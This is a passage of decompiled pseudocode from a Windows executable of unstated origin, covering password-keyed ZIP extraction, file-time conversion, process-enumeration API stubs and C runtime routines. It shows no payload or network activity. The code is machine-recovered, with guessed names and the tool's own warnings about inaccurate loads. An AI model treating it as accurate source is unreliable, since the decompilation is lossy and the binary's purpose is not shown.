    if (iVar4 != 0) goto LAB_00408166;
    pcVar5 = pcStack_8 + (int)local_4 * 0x100;
LAB_00408119:
    if ((iVar6 == 0) && (pcVar5 != unaff_EDI[0x12])) {
      iVar6 = -0x67;
    }
  }
  else {
LAB_00408166:
    pcVar5 = (char *)0x0;
    if (iVar4 == 0) goto LAB_00408119;
    iVar6 = -1;
  }
  *param_1 = *param_1 + (int)pcVar5;
  iVar4 = FUN_00407510((uint *)&local_4);
  pcStack_8 = local_4;
  if (iVar4 == 0) {
    iVar4 = FUN_00407510((uint *)&local_4);
    if (iVar4 == 0) {
      pcStack_8 = pcStack_8 + (int)local_4 * 0x100;
      goto LAB_0040817a;
    }
  }
  pcStack_8 = (char *)0x0;
  if (iVar4 != 0) {
    iVar6 = -1;
  }
LAB_0040817a:
  *param_2 = unaff_EDI[0x1e] + 0x1e + (int)pcVar5;
  *param_3 = pcStack_8;
  *param_1 = *param_1 + (int)pcStack_8;
  return iVar6;
}



undefined4 __cdecl FUN_004081a0(char *param_1)

{
  void **in_EAX;
  int iVar1;
  void **_Memory;
  void *pvVar2;
  void **ppvVar3;
  void **extraout_EDX;
  char *local_c;
  char *local_8;
  char *local_4;
  
  if ((in_EAX == (void **)0x0) || (in_EAX[6] == (void *)0x0)) {
    return 0xffffff9a;
  }
  if (in_EAX[0x1f] != (void *)0x0) {
    FUN_00408590();
  }
  iVar1 = FUN_00407f10(&local_4,&local_c,&local_8);
  if (iVar1 != 0) {
    return 0xffffff99;
  }
  _Memory = (void **)_malloc(0x84);
  if (_Memory != (void **)0x0) {
    pvVar2 = _malloc(0x4000);
    *_Memory = pvVar2;
    _Memory[0x11] = local_c;
    _Memory[0x12] = local_8;
    _Memory[0x13] = (void *)0x0;
    if (pvVar2 != (void *)0x0) {
      _Memory[0x10] = (void *)0x0;
      pvVar2 = in_EAX[0xd];
      _Memory[0x15] = in_EAX[0xf];
      _Memory[0x14] = (void *)0x0;
      _Memory[0x19] = in_EAX[0xd];
      _Memory[0x18] = *in_EAX;
      _Memory[0x1a] = in_EAX[3];
      _Memory[6] = (void *)0x0;
      if (pvVar2 != (void *)0x0) {
        _Memory[9] = (void *)0x0;
        _Memory[10] = (void *)0x0;
        _Memory[0xb] = (void *)0x0;
        iVar1 = FUN_00407060();
        if (iVar1 == 0) {
          _Memory[0x10] = (void *)0x1;
        }
      }
      _Memory[0x16] = in_EAX[0x10];
      _Memory[0x17] = in_EAX[0x11];
      *(byte *)(_Memory + 0x1b) = *(byte *)(in_EAX + 0xc) & 1;
      if (((uint)in_EAX[0xc] >> 3 & 1) == 0) {
        *(undefined *)(_Memory + 0x20) = *(undefined *)((int)in_EAX + 0x3f);
      }
      else {
        *(undefined *)(_Memory + 0x20) = *(undefined *)((int)in_EAX + 0x39);
      }
      ppvVar3 = _Memory + 0x1c;
      _Memory[0x1f] = (void *)(-(uint)(*(char *)(_Memory + 0x1b) != '\0') & 0xc);
      *ppvVar3 = (void *)0x12345678;
      _Memory[0x1d] = (void *)0x23456789;
      _Memory[0x1e] = (void *)0x34567890;
      if (param_1 != (char *)0x0) {
        do {
          if (*param_1 == '\0') break;
          FUN_00406d50(*param_1,(uint *)ppvVar3);
          param_1 = param_1 + 1;
          ppvVar3 = extraout_EDX;
        } while (param_1 != (char *)0x0);
      }
      _Memory[0xf] = local_4 + (int)in_EAX[0x1e] + 0x1e;
      _Memory[2] = (void *)0x0;
      in_EAX[0x1f] = _Memory;
      return 0;
    }
    _free(_Memory);
  }
  return 0xffffff98;
}



int __thiscall FUN_00408320(void *this,void *param_1,undefined *param_2)

{
  void **ppvVar1;
  char cVar2;
  void **ppvVar3;
  char *pcVar4;
  byte *pbVar5;
  undefined uVar6;
  int in_EAX;
  uint uVar7;
  void *pvVar8;
  void *pvVar9;
  int iVar10;
  int extraout_ECX;
  void *pvVar11;
  int local_c;
  int local_8;
  
  local_8 = 0;
  local_c = 0;
  if (param_2 != (undefined *)0x0) {
    *param_2 = 0;
  }
  if ((in_EAX == 0) || (ppvVar3 = *(void ***)(in_EAX + 0x7c), ppvVar3 == (void **)0x0)) {
    return -0x66;
  }
  if (*ppvVar3 == (void *)0x0) {
    return -100;
  }
  if (this != (void *)0x0) {
    ppvVar3[4] = param_1;
    ppvVar3[5] = this;
    if (ppvVar3[0x17] < this) {
      ppvVar3[5] = ppvVar3[0x17];
    }
    if (ppvVar3[5] != (void *)0x0) {
      do {
        if ((ppvVar3[2] == (void *)0x0) && (pvVar9 = ppvVar3[0x16], pvVar9 != (void *)0x0)) {
          pvVar8 = (void *)0x4000;
          if ((pvVar9 < (void *)0x4000) && (pvVar8 = pvVar9, pvVar9 == (void *)0x0)) {
            if (param_2 == (undefined *)0x0) {
              return 0;
            }
            *param_2 = 1;
            return 0;
          }
          pcVar4 = (char *)ppvVar3[0x18];
          iVar10 = (int)ppvVar3[0x1a] + (int)ppvVar3[0xf];
          if (*pcVar4 == '\0') {
            *(int *)(pcVar4 + 0x1c) = iVar10;
          }
          else {
            if (pcVar4[1] == '\0') {
              return -1;
            }
            SetFilePointer(*(HANDLE *)(pcVar4 + 4),*(int *)(pcVar4 + 0xc) + iVar10,(PLONG)0x0,0);
            iVar10 = extraout_ECX;
          }
          uVar7 = FUN_004074b0(iVar10,*ppvVar3,1);
          if (uVar7 != 1) {
            return -1;
          }
          pvVar9 = *ppvVar3;
          ppvVar3[0xf] = (void *)((int)ppvVar3[0xf] + (int)pvVar8);
          ppvVar3[0x16] = (void *)((int)ppvVar3[0x16] - (int)pvVar8);
          ppvVar3[1] = pvVar9;
          ppvVar3[2] = pvVar8;
          if ((*(char *)(ppvVar3 + 0x1b) != '\0') && (pvVar11 = (void *)0x0, pvVar8 != (void *)0x0))
          {
            do {
              uVar6 = FUN_00406da0();
              *(undefined *)((int)pvVar11 + (int)pvVar9) = uVar6;
              pvVar11 = (void *)((int)pvVar11 + 1);
            } while (pvVar11 < pvVar8);
          }
        }
        pvVar9 = ppvVar3[2];
        pvVar8 = ppvVar3[0x1f];
        if (pvVar9 < ppvVar3[0x1f]) {
          pvVar8 = pvVar9;
        }
        if (pvVar8 != (void *)0x0) {
          cVar2 = *(char *)((int)(void *)((int)ppvVar3[1] + (int)pvVar8) + -1);
          ppvVar3[0x17] = (void *)((int)ppvVar3[0x17] - (int)pvVar8);
          ppvVar1 = ppvVar3 + 0x1f;
          *ppvVar1 = (void *)((int)*ppvVar1 - (int)pvVar8);
          ppvVar3[2] = (void *)((int)pvVar9 - (int)pvVar8);
          ppvVar3[1] = (void *)((int)ppvVar3[1] + (int)pvVar8);
          if ((*ppvVar1 == (void *)0x0) && (cVar2 != *(char *)(ppvVar3 + 0x20))) {
            return -0x6a;
          }
        }
        if (ppvVar3[0x19] == (void *)0x0) {
          pvVar9 = ppvVar3[2];
          if (ppvVar3[5] < ppvVar3[2]) {
            pvVar9 = ppvVar3[5];
          }
          pvVar8 = (void *)0x0;
          if (pvVar9 != (void *)0x0) {
            do {
              *(undefined *)((int)pvVar8 + (int)ppvVar3[4]) =
                   *(undefined *)((int)pvVar8 + (int)ppvVar3[1]);
              pvVar8 = (void *)((int)pvVar8 + 1);
            } while (pvVar8 < pvVar9);
          }
          pbVar5 = (byte *)ppvVar3[4];
          pvVar8 = (void *)FUN_00406c40(pbVar5,(uint)pvVar9);
          ppvVar3[0x17] = (void *)((int)ppvVar3[0x17] - (int)pvVar9);
          ppvVar3[2] = (void *)((int)ppvVar3[2] - (int)pvVar9);
          ppvVar3[5] = (void *)((int)ppvVar3[5] - (int)pvVar9);
          ppvVar3[1] = (void *)((int)ppvVar3[1] + (int)pvVar9);
          ppvVar3[6] = (void *)((int)ppvVar3[6] + (int)pvVar9);
          local_c = local_c + (int)pvVar9;
          ppvVar3[0x14] = pvVar8;
          ppvVar3[4] = pbVar5 + (int)pvVar9;
          if ((ppvVar3[0x17] == (void *)0x0) && (param_2 != (undefined *)0x0)) {
            *param_2 = 1;
          }
        }
        else {
          pbVar5 = (byte *)ppvVar3[4];
          pvVar9 = ppvVar3[6];
          local_8 = FUN_00407110();
          uVar7 = (int)ppvVar3[6] - (int)pvVar9;
          pvVar9 = (void *)FUN_00406c40(pbVar5,uVar7);
          ppvVar3[0x17] = (void *)((int)ppvVar3[0x17] - uVar7);
          local_c = local_c + uVar7;
          ppvVar3[0x14] = pvVar9;
          if ((local_8 == 1) || (ppvVar3[0x17] == (void *)0x0)) {
            if (param_2 == (undefined *)0x0) {
              return local_c;
            }
            *param_2 = 1;
            return local_c;
          }
          if (local_8 != 0) {
            return local_8;
          }
        }
      } while (ppvVar3[5] != (void *)0x0);
      if (local_8 != 0) {
        return local_8;
      }
    }
    return local_c;
  }
  return 0;
}



undefined4 FUN_00408590(void)

{
  void **_Memory;
  undefined4 uVar1;
  int unaff_EDI;
  
  uVar1 = 0;
  if (unaff_EDI == 0) {
    return 0xffffff9a;
  }
  _Memory = *(void ***)(unaff_EDI + 0x7c);
  if (_Memory == (void **)0x0) {
    return 0xffffff9a;
  }
  if ((_Memory[0x17] == (void *)0x0) && (_Memory[0x14] != _Memory[0x15])) {
    uVar1 = 0xffffff97;
  }
  if (*_Memory != (void *)0x0) {
    _free(*_Memory);
    *_Memory = (void *)0x0;
  }
  *_Memory = (void *)0x0;
  if (_Memory[0x10] != (void *)0x0) {
    FUN_00407010();
  }
  _Memory[0x10] = (void *)0x0;
  _free(_Memory);
  *(undefined4 *)(unaff_EDI + 0x7c) = 0;
  return uVar1;
}



_FILETIME __fastcall FUN_00408610(uint param_1)

{
  uint in_EAX;
  _FILETIME local_1c;
  SYSTEMTIME local_14;
  
  local_14.wYear = ((ushort)param_1 >> 9) + 0x7bc;
  local_14.wMonth = (ushort)(param_1 >> 5) & 0xf;
  local_14.wDay = (ushort)param_1 & 0x1f;
  local_14.wHour = (ushort)in_EAX >> 0xb;
  local_14.wMinute = (ushort)(in_EAX >> 5) & 0x3f;
  local_14.wSecond = ((ushort)in_EAX & 0x1f) * 2;
  local_14.wMilliseconds = 0;
  SystemTimeToFileTime(&local_14,&local_1c);
  return local_1c;
}



void FUN_00408690(void)

{
  char cVar1;
  char *pcVar2;
  char *pcVar3;
  undefined4 *unaff_ESI;
  
  unaff_ESI[1] = 0xffffffff;
  unaff_ESI[0x8e] = 0xffffffff;
  *unaff_ESI = 0;
  unaff_ESI[0x8f] = 0;
  unaff_ESI[0x90] = 0;
  pcVar2 = &DAT_0042041c;
  do {
    pcVar3 = pcVar2;
    pcVar2 = pcVar3 + 1;
  } while (*pcVar3 != '\0');
  pcVar2 = (char *)operator_new((uint)(pcVar3 + -0x42041b));
  unaff_ESI[0x8f] = pcVar2;
  pcVar3 = &DAT_0042041c;
  do {
    cVar1 = *pcVar3;
    *pcVar2 = cVar1;
    pcVar3 = pcVar3 + 1;
    pcVar2 = pcVar2 + 1;
  } while (cVar1 != '\0');
  return;
}



int FUN_004086f0(undefined4 param_1,undefined4 param_2)

{
  short *psVar1;
  WCHAR WVar2;
  short sVar3;
  int **lpBuffer;
  undefined *puVar4;
  int *piVar5;
  int **unaff_ESI;
  undefined4 *puVar6;
  
  if ((*unaff_ESI == (int *)0x0) && (unaff_ESI[1] == (int *)0xffffffff)) {
    lpBuffer = unaff_ESI + 0x91;
    GetCurrentDirectoryW(0x104,(LPWSTR)lpBuffer);
    do {
      WVar2 = *(WCHAR *)lpBuffer;
      lpBuffer = (int **)((int)lpBuffer + 2);
    } while (WVar2 != L'\0');
    sVar3 = *(short *)((int)unaff_ESI + ((int)lpBuffer - ((int)unaff_ESI + 0x246) >> 1) * 2 + 0x242)
    ;
    if ((sVar3 != 0x5c) && (sVar3 != 0x2f)) {
      puVar6 = (undefined4 *)((int)unaff_ESI + 0x242);
      do {
        psVar1 = (short *)((int)puVar6 + 2);
        puVar6 = (undefined4 *)((int)puVar6 + 2);
      } while (*psVar1 != 0);
      *puVar6 = DAT_0041fb88;
    }
    puVar4 = (undefined *)operator_new(0x20);
    *puVar4 = 0;
    puVar4[1] = 1;
    puVar4[0x10] = 0;
    *(undefined4 *)(puVar4 + 0x14) = param_1;
    *(undefined4 *)(puVar4 + 0x18) = param_2;
    *(undefined4 *)(puVar4 + 0x1c) = 0;
    *(undefined4 *)(puVar4 + 0xc) = 0;
    piVar5 = FUN_004077f0();
    *unaff_ESI = piVar5;
    return (-(uint)(piVar5 != (int *)0x0) & 0xfffffe00) + 0x200;
  }
  return 0x1000000;
}



void __thiscall FUN_004087b0(void *this,int param_1,int *param_2)

{
  wchar_t wVar1;
  char *pcVar2;
  int3 iVar3;
  _FILETIME _Var4;
  byte bVar5;
  int iVar6;
  char *pcVar7;
  wchar_t *pwVar8;
  undefined4 *puVar9;
  uint uVar10;
  byte bVar11;
  int iVar12;
  undefined4 extraout_ECX;
  byte *pbVar13;
  byte bVar14;
  byte bVar15;
  int *piVar16;
  wchar_t *_Str;
  bool bVar17;
  longlong lVar18;
  undefined auStack_394 [5];
  byte bStack_38f;
  undefined uStack_38e;
  undefined uStack_38d;
  undefined4 local_38c;
  char *local_388;
  int *local_384;
  _FILETIME _Stack_380;
  _FILETIME _Stack_378;
  char *local_370;
  uint local_36c [4];
  uint uStack_35c;
  int iStack_354;
  int iStack_350;
  uint uStack_338;
  CHAR local_31c [264];
  WCHAR aWStack_214 [262];
  uint local_8;
  
  local_8 = DAT_00422040 ^ (uint)auStack_394;
  local_384 = (int *)this;
                    // WARNING: Load size is inaccurate
  if ((param_1 < -1) || (*(int *)(*this + 4) <= param_1)) goto LAB_00408d4a;
  if (*(int *)((int)this + 4) != -1) {
    FUN_00408590();
  }
  _Var4.dwHighDateTime = _Stack_378.dwHighDateTime;
  _Var4.dwLowDateTime = _Stack_378.dwLowDateTime;
  *(undefined4 *)((int)this + 4) = 0xffffffff;
  if (param_1 == *(int *)((int)this + 0x238)) {
    if (param_1 != -1) {
      piVar16 = (int *)((int)this + 8);
      for (iVar12 = 0x8c; iVar12 != 0; iVar12 = iVar12 + -1) {
        *param_2 = *piVar16;
        piVar16 = piVar16 + 1;
        param_2 = param_2 + 1;
      }
      goto LAB_00408d4a;
    }
  }
  else if (param_1 != -1) {
                    // WARNING: Load size is inaccurate
    if (param_1 < *(int *)(*this + 0x10)) {
      FUN_00407ed0();
    }
                    // WARNING: Load size is inaccurate
    iVar12 = *(int *)(*this + 0x10);
    while (iVar12 < param_1) {
                    // WARNING: Load size is inaccurate
      iVar12 = *this;
      if (((iVar12 != 0) && (*(int *)(iVar12 + 0x18) != 0)) &&
         (iVar6 = *(int *)(iVar12 + 0x10) + 1, iVar6 != *(int *)(iVar12 + 4))) {
        *(int *)(iVar12 + 0x14) =
             *(int *)(iVar12 + 0x14) +
             *(int *)(iVar12 + 0x50) + *(int *)(iVar12 + 0x4c) + 0x2e + *(int *)(iVar12 + 0x48);
        *(int *)(iVar12 + 0x10) = iVar6;
        iVar6 = FUN_00407a80((int *)(iVar12 + 0x28),(uint *)(iVar12 + 0x78),(void *)0x0,0);
        *(uint *)(iVar12 + 0x18) = (uint)(iVar6 == 0);
      }
                    // WARNING: Load size is inaccurate
      iVar12 = *(int *)(*this + 0x10);
    }
    FUN_00407a80((int *)local_36c,(uint *)0x0,local_31c,0x104);
    iVar12 = FUN_00407f10(&local_370,&local_388,(char **)&local_38c);
    if (iVar12 != 0) goto LAB_00408d4a;
                    // WARNING: Load size is inaccurate
    pcVar2 = **this;
    if (*pcVar2 == '\0') {
      *(char **)(pcVar2 + 0x1c) = local_388;
LAB_00408954:
      pcVar2 = local_38c;
      local_388 = (char *)operator_new((uint)local_38c);
      pcVar7 = (char *)FUN_004074b0(extraout_ECX,local_388,(uint)pcVar2);
      if (pcVar7 == pcVar2) {
        *param_2 = *(int *)(*local_384 + 0x10);
        MultiByteToWideChar(0xfde9,0,local_31c,-1,aWStack_214,0x104);
        _Str = aWStack_214;
        while( true ) {
          while( true ) {
            while( true ) {
              while( true ) {
                while( true ) {
                  while( true ) {
                    for (; (wVar1 = *_Str, wVar1 != L'\0' && (_Str[1] == L':')); _Str = _Str + 2) {
                    }
                    if (wVar1 != L'\\') break;
                    _Str = _Str + 1;
                  }
                  if (wVar1 != L'/') break;
                  _Str = _Str + 1;
                }
                pwVar8 = _wcsstr(_Str,u______0041fb90);
                if (pwVar8 == (wchar_t *)0x0) break;
                _Str = pwVar8 + 4;
              }
              pwVar8 = _wcsstr(_Str,u______0041fb9c);
              if (pwVar8 == (wchar_t *)0x0) break;
              _Str = pwVar8 + 4;
            }
            pwVar8 = _wcsstr(_Str,u______0041fba8);
            if (pwVar8 == (wchar_t *)0x0) break;
            _Str = pwVar8 + 4;
          }
          pwVar8 = _wcsstr(_Str,u______0041fbb4);
          if (pwVar8 == (wchar_t *)0x0) break;
          _Str = pwVar8 + 4;
        }
        iVar12 = 4 - (int)_Str;
        do {
          wVar1 = *_Str;
          *(wchar_t *)((int)param_2 + iVar12 + (int)_Str) = wVar1;
          _Str = _Str + 1;
        } while (wVar1 != L'\0');
        bVar14 = ~(byte)(uStack_338 >> 0x17);
        local_36c[0] = local_36c[0] >> 8;
        bVar11 = (byte)(uStack_338 >> 0x1e);
        uStack_38d = 0;
        bStack_38f = 0;
        uStack_38e = 1;
        if (((local_36c[0] == 0) || (local_36c[0] == 7)) ||
           ((local_36c[0] == 0xb || (local_36c[0] == 0xe)))) {
          bStack_38f = (byte)(uStack_338 >> 2) & 1;
          bVar14 = (byte)uStack_338;
          bVar15 = (byte)(uStack_338 >> 1) & 1;
          bVar11 = (byte)(uStack_338 >> 4);
          bVar5 = (byte)(uStack_338 >> 5) & 1;
        }
        else {
          bVar15 = 0;
          bVar5 = 1;
        }
        iVar12 = 0;
        param_2[0x83] = 0;
        if ((bVar11 & 1) != 0) {
          param_2[0x83] = 0x10;
        }
        if (bVar5 != 0) {
          param_2[0x83] = param_2[0x83] | 0x20;
        }
        if (bVar15 != 0) {
          param_2[0x83] = param_2[0x83] | 2;
        }
        if ((bVar14 & 1) != 0) {
          param_2[0x83] = param_2[0x83] | 1;
        }
        if (bStack_38f != 0) {
          param_2[0x83] = param_2[0x83] | 4;
        }
        param_2[0x8a] = iStack_354;
        param_2[0x8b] = iStack_350;
        _Stack_378 = FUN_00408610(uStack_35c >> 0x10);
        LocalFileTimeToFileTime(&_Stack_378,&_Stack_380);
        pcVar7 = local_388;
        pcVar2 = local_38c;
        param_2[0x84] = _Stack_380.dwLowDateTime;
        param_2[0x85] = _Stack_380.dwHighDateTime;
        param_2[0x86] = _Stack_380.dwLowDateTime;
        param_2[0x87] = _Stack_380.dwHighDateTime;
        param_2[0x88] = _Stack_380.dwLowDateTime;
        param_2[0x89] = _Stack_380.dwHighDateTime;
        if ((char *)0x4 < local_38c) {
          local_38c = (char *)((uint)local_38c & 0xff000000);
          do {
            local_38c = (char *)CONCAT31(CONCAT21(local_38c._2_2_,local_388[iVar12 + 1]),
                                         local_388[iVar12]);
            pbVar13 = &DAT_0041fbc0;
            puVar9 = &local_38c;
            do {
              bVar14 = *(byte *)puVar9;
              bVar17 = bVar14 < *pbVar13;
              if (bVar14 != *pbVar13) {
LAB_00408be0:
                iVar6 = (1 - (uint)bVar17) - (uint)(bVar17 != 0);
                goto LAB_00408be5;
              }
              if (bVar14 == 0) break;
              bVar14 = *(byte *)((int)puVar9 + 1);
              bVar17 = bVar14 < pbVar13[1];
              if (bVar14 != pbVar13[1]) goto LAB_00408be0;
              puVar9 = (undefined4 *)((int)puVar9 + 2);
              pbVar13 = pbVar13 + 2;
            } while (bVar14 != 0);
            iVar6 = 0;
LAB_00408be5:
            if (iVar6 == 0) {
              bVar14 = local_388[iVar12 + 4];
              bStack_38f = bVar14 >> 2 & 1;
              iVar6 = iVar12 + 5;
              if ((bVar14 & 1) != 0) {
                iVar3 = CONCAT21(CONCAT11(local_388[iVar12 + 8],local_388[iVar12 + 7]),
                                 local_388[iVar12 + 6]);
                uVar10 = CONCAT31(iVar3,local_388[iVar6]);
                iVar6 = iVar12 + 9;
                lVar18 = __allmul(uVar10 + 0xb6109100,
                                  ((int)iVar3 >> 0x17) + 2 + (uint)(0x49ef6eff < uVar10),10000000,0)
                ;
                *(longlong *)(param_2 + 0x88) = lVar18;
              }
              if ((bVar14 >> 1 & 1) != 0) {
                iVar3 = CONCAT21(CONCAT11(pcVar7[iVar6 + 3],pcVar7[iVar6 + 2]),pcVar7[iVar6 + 1]);
                uVar10 = CONCAT31(iVar3,pcVar7[iVar6]);
                iVar6 = iVar6 + 4;
                lVar18 = __allmul(uVar10 + 0xb6109100,
                                  ((int)iVar3 >> 0x17) + 2 + (uint)(0x49ef6eff < uVar10),10000000,0)
                ;
                *(longlong *)(param_2 + 0x84) = lVar18;
              }
              if (bStack_38f != 0) {
                iVar3 = CONCAT21(CONCAT11(pcVar7[iVar6 + 3],pcVar7[iVar6 + 2]),pcVar7[iVar6 + 1]);
                uVar10 = CONCAT31(iVar3,pcVar7[iVar6]);
                lVar18 = __allmul(uVar10 + 0xb6109100,
                                  ((int)iVar3 >> 0x17) + 2 + (uint)(0x49ef6eff < uVar10),10000000,0)
                ;
                *(longlong *)(param_2 + 0x86) = lVar18;
              }
              break;
            }
            iVar12 = iVar12 + 4 + (uint)(byte)local_388[iVar12 + 2];
          } while ((char *)(iVar12 + 4U) < pcVar2);
        }
        if (pcVar7 != (char *)0x0) {
          FUN_00409875(pcVar7);
        }
        piVar16 = local_384 + 2;
        for (iVar12 = 0x8c; iVar12 != 0; iVar12 = iVar12 + -1) {
          *piVar16 = *param_2;
          param_2 = param_2 + 1;
          piVar16 = piVar16 + 1;
        }
        local_384[0x8e] = param_1;
        goto LAB_00408d4a;
      }
      FUN_00409875(local_388);
    }
    else if (pcVar2[1] != '\0') {
      SetFilePointer(*(HANDLE *)(pcVar2 + 4),(LONG)(local_388 + *(int *)(pcVar2 + 0xc)),(PLONG)0x0,0
                    );
      goto LAB_00408954;
    }
    goto LAB_00408d4a;
  }
                    // WARNING: Load size is inaccurate
  *param_2 = *(int *)(*this + 4);
  *(undefined2 *)(param_2 + 1) = 0;
  param_2[0x83] = 0;
  param_2[0x84] = 0;
  param_2[0x85] = 0;
  param_2[0x86] = 0;
  param_2[0x87] = 0;
  param_2[0x88] = 0;
  param_2[0x89] = 0;
  param_2[0x8a] = 0;
  param_2[0x8b] = 0;
  _Stack_378 = _Var4;
LAB_00408d4a:
  ___security_check_cookie_4(local_8 ^ (uint)auStack_394);
  return;
}



void FUN_00408d70(void *param_1,void *param_2)

{
  int iVar1;
  int iVar2;
  int *unaff_EBX;
  undefined auStack_8 [3];
  char local_5;
  uint local_4;
  
  local_4 = DAT_00422040 ^ (uint)auStack_8;
  if (unaff_EBX[1] != 0) {
    if (unaff_EBX[1] != -1) {
      FUN_00408590();
    }
    unaff_EBX[1] = -1;
    if (*(int *)(*unaff_EBX + 4) < 1) {
      ___security_check_cookie_4(local_4 ^ (uint)auStack_8);
      return;
    }
    if (0 < *(int *)(*unaff_EBX + 0x10)) {
      FUN_00407ed0();
    }
    iVar2 = *(int *)(*unaff_EBX + 0x10);
    while (iVar2 < 0) {
      iVar2 = *unaff_EBX;
      if (((iVar2 != 0) && (*(int *)(iVar2 + 0x18) != 0)) &&
         (iVar1 = *(int *)(iVar2 + 0x10) + 1, iVar1 != *(int *)(iVar2 + 4))) {
        *(int *)(iVar2 + 0x14) =
             *(int *)(iVar2 + 0x14) +
             *(int *)(iVar2 + 0x50) + *(int *)(iVar2 + 0x4c) + 0x2e + *(int *)(iVar2 + 0x48);
        *(int *)(iVar2 + 0x10) = iVar1;
        iVar1 = FUN_00407a80((int *)(iVar2 + 0x28),(uint *)(iVar2 + 0x78),(void *)0x0,0);
        *(uint *)(iVar2 + 0x18) = (uint)(iVar1 == 0);
      }
      iVar2 = *(int *)(*unaff_EBX + 0x10);
    }
    FUN_004081a0((char *)unaff_EBX[0x8f]);
    unaff_EBX[1] = 0;
  }
  iVar2 = FUN_00408320(param_2,param_1,&local_5);
  if (iVar2 < 1) {
    FUN_00408590();
    unaff_EBX[1] = -1;
  }
  if (local_5 == '\0') {
    if (iVar2 < 1) {
      ___security_check_cookie_4(local_4 ^ (uint)auStack_8);
      return;
    }
    ___security_check_cookie_4(local_4 ^ (uint)auStack_8);
    return;
  }
  ___security_check_cookie_4(local_4 ^ (uint)auStack_8);
  return;
}



void FUN_00408ed0(void)

{
  void **_Memory;
  void *pvVar1;
  void **unaff_ESI;
  
  if (unaff_ESI[1] != (void *)0xffffffff) {
    FUN_00408590();
  }
  _Memory = (void **)*unaff_ESI;
  unaff_ESI[1] = (void *)0xffffffff;
  if (_Memory != (void **)0x0) {
    if (_Memory[0x1f] != (void *)0x0) {
      FUN_00408590();
    }
    pvVar1 = *_Memory;
    if (pvVar1 != (void *)0x0) {
      if (*(char *)((int)pvVar1 + 0x10) != '\0') {
        CloseHandle(*(HANDLE *)((int)pvVar1 + 4));
      }
      FUN_00409875(pvVar1);
    }
    _free(_Memory);
  }
  *unaff_ESI = (void *)0x0;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 * __cdecl FUN_00408f30(undefined4 param_1,undefined4 param_2)

{
  void *pvVar1;
  int iVar2;
  undefined4 *puVar3;
  void *local_c;
  undefined *puStack_8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack_8 = &LAB_0041b49b;
  local_c = ExceptionList;
  ExceptionList = &local_c;
  pvVar1 = operator_new(0x44c);
  local_4 = 0;
  if (pvVar1 == (void *)0x0) {
    iVar2 = 0;
  }
  else {
    iVar2 = FUN_00408690();
  }
  local_4 = 0xffffffff;
  _DAT_00424fa8 = FUN_004086f0(param_1,param_2);
  if (_DAT_00424fa8 != 0) {
    if (iVar2 != 0) {
      FUN_00408fe0();
    }
    ExceptionList = local_c;
    return (undefined4 *)0x0;
  }
  puVar3 = (undefined4 *)operator_new(8);
  *puVar3 = 1;
  puVar3[1] = iVar2;
  ExceptionList = local_c;
  return puVar3;
}



void FUN_00408fe0(void)

{
  void *unaff_ESI;
  
  if (*(void **)((int)unaff_ESI + 0x23c) != (void *)0x0) {
    FUN_00409875(*(void **)((int)unaff_ESI + 0x23c));
  }
  *(undefined4 *)((int)unaff_ESI + 0x23c) = 0;
  if (*(void **)((int)unaff_ESI + 0x240) != (void *)0x0) {
    FUN_00409875(*(void **)((int)unaff_ESI + 0x240));
  }
  *(undefined4 *)((int)unaff_ESI + 0x240) = 0;
  FUN_00409875(unaff_ESI);
  return;
}



void CreateToolhelp32Snapshot(void)

{
                    // WARNING: Could not recover jumptable at 0x00409026. Too many branches
                    // WARNING: Treating indirect jump as call
  CreateToolhelp32Snapshot();
  return;
}



void Process32FirstW(void)

{
                    // WARNING: Could not recover jumptable at 0x0040902c. Too many branches
                    // WARNING: Treating indirect jump as call
  Process32FirstW();
  return;
}



void Process32NextW(void)

{
                    // WARNING: Could not recover jumptable at 0x00409032. Too many branches
                    // WARNING: Treating indirect jump as call
  Process32NextW();
  return;
}



// Library Function - Single Match
//  @__security_check_cookie@4
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void __fastcall ___security_check_cookie_4(int param_1)

{
  if (param_1 == DAT_00422040) {
    return;
  }
                    // WARNING: Subroutine does not return
  ___report_gsfailure();
}



// Library Function - Single Match
//  _wcscat_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl _wcscat_s(wchar_t *_Dst,rsize_t _SizeInWords,wchar_t *_Src)

{
  wchar_t wVar1;
  int *piVar2;
  wchar_t *pwVar3;
  errno_t eVar4;
  
  if ((_Dst != (wchar_t *)0x0) && (_SizeInWords != 0)) {
    pwVar3 = _Dst;
    if (_Src != (wchar_t *)0x0) {
      do {
        if (*pwVar3 == L'\0') break;
        pwVar3 = pwVar3 + 1;
        _SizeInWords = _SizeInWords - 1;
      } while (_SizeInWords != 0);
      if (_SizeInWords != 0) {
        do {
          wVar1 = *_Src;
          *pwVar3 = wVar1;
          pwVar3 = pwVar3 + 1;
          _Src = _Src + 1;
          if (wVar1 == L'\0') break;
          _SizeInWords = _SizeInWords - 1;
        } while (_SizeInWords != 0);
        if (_SizeInWords != 0) {
          return 0;
        }
        *_Dst = L'\0';
        piVar2 = __errno();
        eVar4 = 0x22;
        *piVar2 = 0x22;
        goto LAB_00409069;
      }
    }
    *_Dst = L'\0';
  }
  piVar2 = __errno();
  eVar4 = 0x16;
  *piVar2 = 0x16;
LAB_00409069:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar4;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __wfsopen
// 
// Library: Visual Studio 2008 Release

FILE * __cdecl __wfsopen(wchar_t *_Filename,wchar_t *_Mode,int _ShFlag)

{
  int *piVar1;
  FILE *pFVar2;
  undefined local_14 [8];
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_004206e0;
  uStack_c = 0x4090d0;
  if (((_Filename == (wchar_t *)0x0) || (_Mode == (wchar_t *)0x0)) || (*_Mode == L'\0')) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    pFVar2 = __getstream();
    if (pFVar2 == (FILE *)0x0) {
      piVar1 = __errno();
      *piVar1 = 0x18;
    }
    else {
      local_8 = (undefined *)0x0;
      if (*_Filename != L'\0') {
        pFVar2 = __wopenfile(_Filename,_Mode,_ShFlag,pFVar2);
        local_8 = (undefined *)0xfffffffe;
        FUN_00409180();
        return pFVar2;
      }
      piVar1 = __errno();
